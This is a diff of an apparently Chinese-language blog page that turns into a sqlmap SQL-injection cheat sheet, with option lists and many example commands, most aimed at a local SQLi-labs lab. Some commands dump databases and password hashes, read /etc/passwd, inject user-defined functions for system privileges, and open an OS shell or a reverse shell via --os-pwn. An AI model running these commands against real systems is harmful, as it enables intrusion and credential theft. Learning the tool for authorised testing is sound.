+<h3 id="Fingerprint（指纹）："><a href="#Fingerprint（指纹）：" class="headerlink" title="Fingerprint（指纹）："></a>Fingerprint（指纹）：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-f, --fingerprint 执行检查广泛的DBMS版本指纹</span><br></pre></td></tr></table></figure>
+
+<h3 id="用户定义函数注入："><a href="#用户定义函数注入：" class="headerlink" title="用户定义函数注入："></a>用户定义函数注入：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">--udf-inject 注入用户自定义函数</span><br><span class="line"></span><br><span class="line">--shared-lib=SHLIB 共享库的本地路径</span><br></pre></td></tr></table></figure>
+
 <h3 id="Brute-force（蛮力）："><a href="#Brute-force（蛮力）：" class="headerlink" title="Brute force（蛮力）："></a>Brute force（蛮力）：</h3><p>这些选项可以被用来运行蛮力检查。</p>
-<ul>
-<li>–common-tables 检查存在共同表</li>
-<li>–common-columns 检查存在共同列</li>
-</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">–common-tables 检查存在共同表</span><br><span class="line"></span><br><span class="line">–common-columns 检查存在共同列</span><br></pre></td></tr></table></figure>
+
 <p>User-defined function injection（用户自定义函数注入）：<br> 这些选项可以用来创建用户自定义函数。</p>
-<p>–udf-inject 注入用户自定义函数<br> –shared-lib&#x3D;SHLIB 共享库的本地路径</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">–udf-inject 注入用户自定义函数</span><br><span class="line"> –shared-lib=SHLIB 共享库的本地路径</span><br></pre></td></tr></table></figure>
+
+<h3 id="强制使用-SSL-HTTPS"><a href="#强制使用-SSL-HTTPS" class="headerlink" title="强制使用 SSL&#x2F;HTTPS"></a>强制使用 SSL&#x2F;HTTPS</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">--hpp 使用 HTTP 参数污染</span><br><span class="line"></span><br><span class="line">--eval=EVALCODE 供提交请求之前评估参数的 Python 代码(e.g.</span><br><span class="line"></span><br><span class="line">&quot;import hashlib;id2=hashlib.md5(id).hexdigest()&quot;)</span><br></pre></td></tr></table></figure>
+
 <h3 id="File-system-access（访问文件系统）："><a href="#File-system-access（访问文件系统）：" class="headerlink" title="File system access（访问文件系统）："></a>File system access（访问文件系统）：</h3><p>这些选项可以被用来访问后端数据库管理系统的底层文件系统。</p>
-<ul>
-<li>–file-read&#x3D;RFILE 从后端的数据库管理系统文件系统读取文件</li>
-<li>–file-write&#x3D;WFILE 编辑后端的数据库管理系统文件系统上的本地文件</li>
-<li>–file-dest&#x3D;DFILE 后端的数据库管理系统写入文件的绝对路径</li>
-</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">–file-read=RFILE 从后端的数据库管理系统文件系统读取文件</span><br><span class="line"></span><br><span class="line">–file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件</span><br><span class="line"></span><br><span class="line">–file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径</span><br></pre></td></tr></table></figure>
+
 <h3 id="Operating-system-access（操作系统访问）："><a href="#Operating-system-access（操作系统访问）：" class="headerlink" title="Operating system access（操作系统访问）："></a>Operating system access（操作系统访问）：</h3><p>这些选项可以用于访问后端数据库管理系统的底层操作系统。</p>
-<ul>
-<li>–os-cmd&#x3D;OSCMD 执行操作系统命令</li>
-<li>–os-shell 交互式的操作系统的shell</li>
-<li>–os-pwn 获取一个OOB shell，meterpreter或VNC</li>
-<li>–os-smbrelay 一键获取一个OOB shell，meterpreter或VNC</li>
-<li>–os-bof 存储过程缓冲区溢出利用</li>
-<li>–priv-esc 数据库进程用户权限提升</li>
-<li>–msf-path&#x3D;MSFPATH Metasploit Framework本地的安装路径</li>
-<li>–tmp-path&#x3D;TMPPATH 远程临时文件目录的绝对路径</li>
-</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">–os-cmd=OSCMD 执行操作系统命令</span><br><span class="line"></span><br><span class="line">–os-shell 交互式的操作系统的shell</span><br><span class="line"></span><br><span class="line">–os-pwn 获取一个OOB shell，meterpreter或VNC</span><br><span class="line"></span><br><span class="line">–os-smbrelay 一键获取一个OOB shell，meterpreter或VNC</span><br><span class="line"></span><br><span class="line">–os-bof 存储过程缓冲区溢出利用</span><br><span class="line"></span><br><span class="line">–priv-esc 数据库进程用户权限提升</span><br><span class="line"></span><br><span class="line">–msf-path=MSFPATH Metasploit Framework本地的安装路径</span><br><span class="line"></span><br><span class="line">–tmp-path=TMPPATH 远程临时文件目录的绝对路径</span><br></pre></td></tr></table></figure>
+
 <h3 id="Windows注册表访问："><a href="#Windows注册表访问：" class="headerlink" title="Windows注册表访问："></a>Windows注册表访问：</h3><p>这些选项可以被用来访问后端数据库管理系统Windows注册表。</p>
-<ul>
-<li>–reg-read 读一个Windows注册表项值</li>
-<li>–reg-add 写一个Windows注册表项值数据</li>
-<li>–reg-del 删除Windows注册表键值</li>
-<li>–reg-key&#x3D;REGKEY Windows注册表键</li>
-<li>–reg-value&#x3D;REGVAL Windows注册表项值</li>
-<li>–reg-data&#x3D;REGDATA Windows注册表键值数据</li>
-<li>–reg-type&#x3D;REGTYPE Windows注册表项值类型</li>
-</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">–reg-read 读一个Windows注册表项值</span><br><span class="line"></span><br><span class="line">–reg-add 写一个Windows注册表项值数据</span><br><span class="line"></span><br><span class="line">–reg-del 删除Windows注册表键值</span><br><span class="line"></span><br><span class="line">–reg-key=REGKEY Windows注册表键</span><br><span class="line"></span><br><span class="line">–reg-value=REGVAL Windows注册表项值</span><br><span class="line"></span><br><span class="line">–reg-data=REGDATA Windows注册表键值数据</span><br><span class="line"></span><br><span class="line">–reg-type=REGTYPE Windows注册表项值类型</span><br></pre></td></tr></table></figure>
+
 <p>这些选项可以用来设置一些一般的工作参数。</p>
-<ul>
-<li>-t TRAFFICFILE 记录所有HTTP流量到一个文本文件中</li>
-<li>-s SESSIONFILE 保存和恢复检索会话文件的所有数据</li>
-<li>–flush-session 刷新当前目标的会话文件</li>
-<li>–fresh-queries 忽略在会话文件中存储的查询结果</li>
-<li>–eta 显示每个输出的预计到达时间</li>
-<li>–update 更新SqlMap</li>
-<li>–save file保存选项到INI配置文件</li>
-<li>–batch 从不询问用户输入，使用所有默认配置。</li>
-</ul>
-<h3 id="Miscellaneous（杂项）："><a href="#Miscellaneous（杂项）：" class="headerlink" title="Miscellaneous（杂项）："></a>Miscellaneous（杂项）：</h3><ul>
-<li>–beep 发现SQL注入时提醒</li>
-<li>–check-payload IDS对注入payloads的检测测试</li>
-<li>–cleanup SqlMap具体的UDF和表清理DBMS</li>
-<li>–forms 对目标URL的解析和测试形式</li>
-<li>–gpage&#x3D;GOOGLEPAGE 从指定的页码使用谷歌dork结果</li>
-<li>–page-rank Google dork结果显示网页排名（PR）</li>
-<li>–parse-errors 从响应页面解析数据库管理系统的错误消息</li>
-<li>–replicate 复制转储的数据到一个sqlite3数据库</li>
-<li>–tor 使用默认的Tor（Vidalia&#x2F; Privoxy&#x2F; Polipo）代理地址</li>
-<li>–wizard 给初级用户的简单向导界面</li>
-</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">-s SESSIONFILE 从存储(.sqlite)文件中读取会话</span><br><span class="line">-t TRAFFICFILE 记录所有 HTTP 流量为一个文本文件</span><br><span class="line">--batch</span><br><span class="line">从不询问用户输入, 使用默认行为</span><br><span class="line">--charset=CHARSET 强制数据检索使用的字符编码</span><br><span class="line">--crawl=CRAWLDEPTH 从目标 URL 抓取起始网页</span><br><span class="line">--csv-del=CSVDEL CSV 输出中使用的定界符(默认&quot;,&quot;)</span><br><span class="line">--dump-format=DU.. 转储数据的格式(CSV(默认), 可以设置为 HTML</span><br><span class="line">或 SQLITE)</span><br><span class="line">--eta 显示每个输出的预计到达时间</span><br><span class="line">--flush-session 刷新当前目标的会话文件</span><br><span class="line">--forms</span><br><span class="line">分析并测试目标 URL 中的表单</span><br><span class="line">--fresh-queries 忽略在会话文件中存储的查询结果</span><br><span class="line">--hex 对数据检索使用 DBMS 的 hex 函数</span><br><span class="line">--output-dir=OUT.. 自定义输出目录路径--parse-errors 从响应中分析并显示 DBMS 错误消息</span><br><span class="line">--pivot-column=P.. 透视字段</span><br><span class="line">--save 保存选项到 INI 配置文件</span><br><span class="line">--scope=SCOPE 用正则表达式从所提供的代理日志过滤目标</span><br><span class="line">--test-filter=TE.. 通过攻击载荷和(或)标题选择测试(e.g. ROW)</span><br><span class="line">--update 更新 sqlmap</span><br></pre></td></tr></table></figure>
+
+<h3 id="Miscellaneous（杂项）："><a href="#Miscellaneous（杂项）：" class="headerlink" title="Miscellaneous（杂项）："></a>Miscellaneous（杂项）：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">-z MNEMONICS 使用短记忆法(e.g. &quot;flu,bat,ban,tec=EU&quot;)</span><br><span class="line">--alert=ALERT 当找到 SQL 注入时运行操作系统命令</span><br><span class="line">--answers=ANSWERS 设置问题的答案(e.g. &quot;quit=N,follow=N&quot;)</span><br><span class="line">--beep 当找到 SQL 注入时发出蜂鸣</span><br><span class="line">--check-waf 启发式检查 WAF/IPS/IDS 保护</span><br><span class="line">--cleanup 从 sqlmap 具体 UDF 和表清理 DBMS</span><br><span class="line">--dependencies 检查是否缺少(非核心)的 sqlmap 的依赖</span><br><span class="line">--disable-coloring 禁用控制台输出着色</span><br><span class="line">--gpage=GOOGLEPAGE 从指定页码使用 Google dork 结果</span><br><span class="line">--identify-waf 使测试通过 WAF/IPS/IDS 保护</span><br><span class="line">--mobile 通过 HTTP User-Agent 头模拟智能手机</span><br><span class="line">--page-rank 为 Google dork 结果显示网页排名(PR)</span><br><span class="line">–forms 对目标URL的解析和测试形式</span><br><span class="line">–parse-errors 从响应页面解析数据库管理系统的错误消息</span><br><span class="line">–replicate 复制转储的数据到一个sqlite3数据库</span><br><span class="line">–tor 使用默认的Tor（Vidalia/ Privoxy/ Polipo）代理地址</span><br><span class="line">--purge-output 从输出目录中安全删除所有内容</span><br><span class="line">--smart 仅通过积极的启发式进行测试</span><br><span class="line">--wizard 用于初级用户的简单向导接口</span><br></pre></td></tr></table></figure>
+
+<h3 id="SQLMAP基础信息"><a href="#SQLMAP基础信息" class="headerlink" title="SQLMAP基础信息"></a>SQLMAP基础信息</h3><p> <strong>获取当前用户名称</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sql/Less-1/?id=1&quot; --current-user</span><br></pre></td></tr></table></figure>
+
+<p><strong>获取当前数据库名称</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sql/Less-1/?id=1&quot; --current-db</span><br></pre></td></tr></table></figure>
+
+<p><strong>获取表名</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sql/Less-1/?id=1&quot; -D security --tables</span><br></pre></td></tr></table></figure>
+
+<p><strong>获取字段</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sql/Less-1/?id=1&quot; -D security -T users --columns</span><br></pre></td></tr></table></figure>
+
+<p><strong>获取字段内容</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sql/Less-1/?id=1&quot; -D security -T users -C id --dump</span><br></pre></td></tr></table></figure>
+
+<h3 id="SQLMAP进阶信息内容"><a href="#SQLMAP进阶信息内容" class="headerlink" title="SQLMAP进阶信息内容"></a>SQLMAP进阶信息内容</h3><p><strong>执行测试等级</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sql/Less-1/?id=1&quot; --level 2</span><br></pre></td></tr></table></figure>
+
+<p><strong>指定数据库类型</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sql/Less-1/?id=1&quot; --dbms &quot;Mysql&quot;</span><br></pre></td></tr></table></figure>
+
+<p><strong>列数据库用户</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sql/Less-1/?id=1&quot; --users</span><br></pre></td></tr></table></figure>
+
+<p><strong>列数据库</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sql/Less-1/?id=1&quot; --dbs</span><br></pre></td></tr></table></figure>
+
+<p><strong>数据库用户密码</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sql/Less-1/?id=1&quot; --passwords</span><br></pre></td></tr></table></figure>
+
+<p><strong>列出指定用户数据库密码</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sql/Less-1/?id=1&quot; --passwords -U root</span><br></pre></td></tr></table></figure>
+
+<p><strong>查看权限</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sql/Less-1/?id=1&quot; --privileges</span><br></pre></td></tr></table></figure>
+
+<p><strong>查看指定用户权限</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sql/Less-1/?id=1&quot; --privileges -U root</span><br></pre></td></tr></table></figure>
+
+<p><strong>是否是数据库管理员</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sql/Less-1/?id=1&quot; --is-dba</span><br></pre></td></tr></table></figure>
+
+<p><strong>枚举数据库用户角色</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sql/Less-1/?id=1&quot; --roles</span><br></pre></td></tr></table></figure>
+
+<p><strong>导入用户自定义函数（获取系统权限！）</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap/sqlmap.py -u &quot;http://url/news?id=1&quot;   --udf-inject</span><br></pre></td></tr></table></figure>
+
+<p><strong>cookie注入</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap/sqlmap.py -u &quot;http://url/news?id=1&quot;   --cookie &quot;COOKIE_VALUE&quot;</span><br></pre></td></tr></table></figure>
+
+<p><strong>获取banner信息</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sql/Less-1/?id=1&quot; -b</span><br></pre></td></tr></table></figure>
+
+<p><strong>post注入</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap/sqlmap.py -u &quot;http://url/news?id=1&quot; --data &quot;id=3&quot;</span><br></pre></td></tr></table></figure>
+
+<p><strong>指纹判别数据库类型</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sql/Less-1/?id=1&quot; -f</span><br></pre></td></tr></table></figure>
+
+<p><strong>代理注入</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap/sqlmap.py -u &quot;http://url/news?id=1&quot;  --proxy&quot;http://127.0.0.1:8118&quot;</span><br></pre></td></tr></table></figure>
+
+<p><strong>指定关键词</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap/sqlmap.py -u &quot;http://url/news?id=1&quot;--string&quot;STRING_ON_TRUE_PAGE&quot;</span><br></pre></td></tr></table></figure>
+
+<p><strong>执行系统命令</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap/sqlmap.py -u &quot;http://url/news?id=1&quot;   --file /etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p><strong>统交互shell</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap/sqlmap.py -u &quot;http://url/news?id=1&quot;   --os-shell</span><br></pre></td></tr></table></figure>
+
+<p><strong>反弹shell</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap/sqlmap.py -u &quot;http://url/news?id=1&quot;   --os-pwn</span><br></pre></td></tr></table></figure>
+
+<p><strong>读取win系统注册表</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap/sqlmap.py -u &quot;http://url/news?id=1&quot;   --reg-read</span><br></pre></td></tr></table></figure>
+
+<p><strong>保存进度</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap/sqlmap.py -u &quot;http://url/news?id=1&quot;    --dbs-o &quot;sqlmap.log&quot;</span><br></pre></td></tr></table></figure>
+
+<p><strong>恢复已保存进度</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap/sqlmap.py -u &quot;http://url/news?id=1&quot;    --dbs  -o &quot;sqlmap.log&quot; --resume</span><br></pre></td></tr></table></figure>
+
+<p>3.SQLMAP绕过WAF</p>
+<p>4.SQLMAP提权</p>
 
       
     </div>
@@ -1345,13 +1337,13 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-line"></i>
     </span>
-    <span title="站点总字数">162k</span>
+    <span title="站点总字数">166k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">4:54</span>
+    <span title="站点阅读时长">5:02</span>
   </span>
 </div>
 <div class="busuanzi-count">
